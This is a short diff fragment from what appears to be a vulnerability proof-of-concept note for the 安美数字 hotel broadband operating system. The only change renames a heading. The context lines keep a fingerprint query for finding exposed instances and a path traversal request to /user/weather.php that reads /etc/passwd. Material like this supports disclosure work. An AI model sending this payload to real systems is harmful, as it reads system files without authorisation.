@@ -8,7 +8,7 @@
 app="安美数字-酒店宽带运营系统"
 ```
 
-## poc
+## POC
 
 ```java
 GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
